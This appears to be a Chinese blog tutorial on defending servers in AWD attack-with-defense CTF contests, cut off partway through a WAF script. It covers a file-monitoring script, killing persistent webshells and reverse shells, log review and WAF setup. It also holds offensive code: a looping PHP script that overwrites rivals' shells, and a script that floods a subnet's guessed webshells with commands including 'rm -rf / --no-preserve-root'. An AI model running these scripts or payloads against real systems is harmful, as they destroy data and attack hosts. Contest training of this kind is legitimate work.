<span class="hljs-comment"># 免死金牌</span><br>UNICODE_ENCODING = <span class="hljs-string">&quot;utf-8&quot;</span><br>INVALID_UNICODE_CHAR_FORMAT = <span class="hljs-string">r&quot;\?%02x&quot;</span><br><br><span class="hljs-comment"># 文件路径字典</span><br>spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))<br>Special_path = &#123;<br>    <span class="hljs-string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),<br>    <span class="hljs-string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),<br>    <span class="hljs-string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),<br>    <span class="hljs-string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isListLike</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">isinstance</span>(value, (<span class="hljs-built_in">list</span>, <span class="hljs-built_in">tuple</span>, <span class="hljs-built_in">set</span>))<br><br><span class="hljs-comment"># 获取Unicode编码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUnicode</span>(<span class="hljs-params">value, encoding=<span class="hljs-literal">None</span>, noneToNull=<span class="hljs-literal">False</span></span>):<br><br>    <span class="hljs-keyword">if</span> noneToNull <span class="hljs-keyword">and</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> NULL<br><br>    <span class="hljs-keyword">if</span> isListLike(value):<br>        value = <span class="hljs-built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value)<br>        <span class="hljs-keyword">return</span> value<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, unicode):<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> unicode(value, encoding <span class="hljs-keyword">or</span> UNICODE_ENCODING)<br>            <span class="hljs-keyword">except</span> UnicodeDecodeError, ex:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">return</span> unicode(value, UNICODE_ENCODING)<br>                <span class="hljs-keyword">except</span>:<br>                    value = value[:ex.start] + <span class="hljs-string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="hljs-built_in">ord</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> unicode(value)<br>        <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>            <span class="hljs-keyword">return</span> unicode(<span class="hljs-built_in">str</span>(value), errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment"># 目录创建</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mkdir_p</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">import</span> errno<br>    <span class="hljs-keyword">try</span>:<br>        os.makedirs(path)<br>    <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> exc:<br>        <span class="hljs-keyword">if</span> exc.errno == errno.EEXIST <span class="hljs-keyword">and</span> os.path.isdir(path):<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>: <span class="hljs-keyword">raise</span><br><br><span class="hljs-comment"># 获取当前所有文件路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilelist</span>(<span class="hljs-params">cwd</span>):<br>    filelist = []<br>    <span class="hljs-keyword">for</span> root,subdirs, files <span class="hljs-keyword">in</span> os.walk(cwd):<br>        <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> files:<br>            originalfile = os.path.join(root, filepath)<br>            <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> originalfile:<br>                filelist.append(originalfile)<br>    <span class="hljs-keyword">return</span> filelist<br><br><span class="hljs-comment"># 计算机文件MD5值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calcMD5</span>(<span class="hljs-params">filepath</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            md5obj = hashlib.md5()<br>            md5obj.update(f.read())<br>            <span class="hljs-built_in">hash</span> = md5obj.hexdigest()<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)<br>        <span class="hljs-built_in">print</span> getUnicode(e)<br>        <span class="hljs-keyword">try</span>:<br>            ORIGIN_FILE_LIST.remove(filepath)<br>            FILE_MD5_DICT.pop(filepath, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> KeyError, e:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># 获取所有文件MD5</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilemd5dict</span>(<span class="hljs-params">filelist = []</span>):<br>    filemd5dict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> ori_file <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ori_file:<br>            md5 = calcMD5(os.path.realpath(ori_file))<br>            <span class="hljs-keyword">if</span> md5:<br>                filemd5dict[ori_file] = md5<br>    <span class="hljs-keyword">return</span> filemd5dict<br><br><span class="hljs-comment"># 备份所有文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backup_file</span>(<span class="hljs-params">filelist=[]</span>):<br>    <span class="hljs-comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br>    <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filepath:<br>            shutil.copy2(filepath, Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;---------start------------&#x27;</span><br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> Special_path:<br>        mkdir_p(Special_path[value])<br>    <span class="hljs-comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br>    ORIGIN_FILE_LIST = getfilelist(CWD)<br>    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)<br>    backup_file(ORIGIN_FILE_LIST) <span class="hljs-comment"># TODO 备份文件可能会产生重名BUG</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] pre work end!&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_list = getfilelist(CWD)<br>        <span class="hljs-comment"># 移除新上传文件</span><br>        diff_file_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(file_list) ^ <span class="hljs-built_in">set</span>(ORIGIN_FILE_LIST))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(diff_file_list) != <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># import pdb;pdb.set_trace()</span><br>            <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> diff_file_list:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)<br>                        shutil.move(filepath, os.path.join(Special_path[<span class="hljs-string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="hljs-string">&#x27; : &#x27;</span> + <span class="hljs-built_in">str</span>(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)<br><br>        <span class="hljs-comment"># 防止任意文件被修改,还原被修改文件</span><br>        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)<br>        <span class="hljs-keyword">for</span> filekey <span class="hljs-keyword">in</span> md5_dict:<br>            <span class="hljs-keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filekey, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)<br>                        shutil.move(filekey, os.path.join(Special_path[<span class="hljs-string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                        shutil.move(os.path.join(Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="hljs-string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)<br>                        <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime())</span><br></code></pre></td></tr></table></figure>
+
+<p>运行：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python jiankong.py  <span class="hljs-regexp">/var/</span>www/html<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="杀不死马"><a href="#杀不死马" class="headerlink" title="杀不死马"></a>杀不死马</h3><p>查看进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep www-data  <br><span class="hljs-comment"># 将指定用户进程过滤</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data  6690  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data  6693  0.0  0.4 315800  9056 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data  7170  0.0  0.6 316312 14100 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data  7239  0.0  0.6 316172 14020 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data  7526  0.0  0.4 315620  8364 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FOREGROUND<br>www-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUND<br>root     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep --color=auto www-data<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x01-杀进程"><a href="#0x01-杀进程" class="headerlink" title="0x01.杀进程"></a>0x01.杀进程</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> 对应的进程号<br></code></pre></td></tr></table></figure>
+
+<p>或执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep www-data | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="hljs-built_in">kill</span> -9<br>ps aux | grep www-data | grep -v grep | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs <span class="hljs-built_in">kill</span> -9<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux<br>列出进程信息<br><br>grep www-data<br>在进程信息中找到需要杀死的进程<br><br>grep -v grep<br>在进程信息中剔除带grep的信息<br><br>awk ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$2</span>&#125;’<br>提取字符串行内容的第2个字段，也就是当前示例的进程号<br><br>xargs <span class="hljs-built_in">kill</span> -9<br>将进程号作为参数传递给<span class="hljs-built_in">kill</span> -9这个命令<br></code></pre></td></tr></table></figure>
+
+<p>杀了进程之后清除不死马文件</p>
+<h4 id="0x02-重启php等web应用-不推荐"><a href="#0x02-重启php等web应用-不推荐" class="headerlink" title="0x02.重启php等web应用(不推荐)"></a>0x02.重启php等web应用(不推荐)</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">service php-fpm restart</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x03-竞争写入"><a href="#0x03-竞争写入" class="headerlink" title="0x03.竞争写入"></a>0x03.竞争写入</h4><p>用一个<code>ignore_user_abort(true)</code>脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.3.php&#x27;</span>; <span class="hljs-comment"># shell name</span><br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;on shit&#x27;</span>;<br>    <span class="hljs-comment">//pass=pass</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);<br>    <span class="hljs-comment">//    usleep(5000);</span><br>          <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>使用脚本将别人写的shell给挤掉</p>
+<h3 id="清除反弹shell"><a href="#清除反弹shell" class="headerlink" title="清除反弹shell"></a>清除反弹shell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> <span class="hljs-literal">-ef</span> <br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-aux</span><br></code></pre></td></tr></table></figure>
+
+<p>出现www-data权限的&#x2F;bin&#x2F;sh一般为nc</p>
+<p>然后杀进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> `ps -aux | grep www-data | grep apache2 | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。</p>
+<p>关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</p>
+<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>实时地查看 Apache 服务器访问日志中最新的日志记录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> --follow=name /var/log/apache2/access.log<br></code></pre></td></tr></table></figure>
+
+<p>log存放地址：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>logs<br><span class="hljs-regexp">/usr/</span>nginx<span class="hljs-regexp">/logs/</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>为了对其他防守方进行<strong>干扰</strong>，可以利用脚本发生大量垃圾数据包，混淆视觉，给对方人员增加检测的难度，浪费对方的时间。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_attack</span>():<br>    file=&#123;<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;admin.php&#x27;</span>,<span class="hljs-string">&#x27;web.php&#x27;</span>,<span class="hljs-string">&#x27;login.php&#x27;</span>,<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>&#125;<br>    payload=&#123;<span class="hljs-string">&#x27;cat /flag&#x27;</span>,<span class="hljs-string">&#x27;ls -al&#x27;</span>,<span class="hljs-string">&#x27;rm -f&#x27;</span>,<span class="hljs-string">&#x27;echo 1&#x27;</span>,<span class="hljs-string">&#x27;echo 1 /proc/sys/net/ipv4/ip_forward&#x27;</span>,<span class="hljs-string">&#x27;rm -rf / --no-preserve-root&#x27;</span>&#125;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">255</span>):<br>            <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> file:<br>                url=<span class="hljs-string">&#x27;http://192.168.182.&#x27;</span>+ <span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;/&#x27;</span>+ii<br>                <span class="hljs-built_in">print</span>(url)<br>                <span class="hljs-keyword">for</span> iii <span class="hljs-keyword">in</span> payload:<br>                    data=&#123;<br>                        <span class="hljs-string">&#x27;payload&#x27;</span>:iii<br>                    &#125;<br>                    <span class="hljs-keyword">try</span>:<br>                        requests.post(url,data=data)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在搅屎:&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;|&#x27;</span>+ii+<span class="hljs-string">&#x27;|&#x27;</span>+iii)<br>                        time.sleep(<span class="hljs-number">0.1</span>)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        time.sleep(<span class="hljs-number">0.1</span>)<br>                        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_attack()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>备份好源码之后要做的就是监控访问，截取攻击向量，做好流量重放的准备。一般的 WAF 只需要做到记录访问的基本信息如时间，ip，get，post，cookie，UA即可。也可以自行编写通防 WAF，功能如关键字检测，截取上传文件内容等。</p>
+<p>可以使用 bash 命令在每一个 php 文件前面加上 <code>require_once</code> 包含 WAF 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once &quot;/tmp/waf.php&quot;;?&gt;</span><br><span class="hljs-comment"># -path 指需要排除的路径</span><br>find /var/www/html/ -path /var/www/html/folder -prune -o  -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&#x27;*.php&#x27;</span>|xargs  sed -i <span class="hljs-string">&#x27;1i&lt;?php require_once &quot;/tmp/waf.php&quot;;?&gt;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">; Automatically add files before PHP document.<br>; http:<span class="hljs-comment">//php.net/auto-prepend-file</span><br>auto_prepend_file = /tmp/waf.php<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="WAF脚本1："><a href="#WAF脚本1：" class="headerlink" title="WAF脚本1："></a>WAF脚本1：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//error_reporting(E_ALL);</span><br><span class="hljs-comment">//ini_set(&#x27;display_errors&#x27;, 1);</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">检测请求方式，除了get和post之外拦截下来并写日志。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;method&quot;</span>);<br>&#125;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//获取uri来进行检测</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span 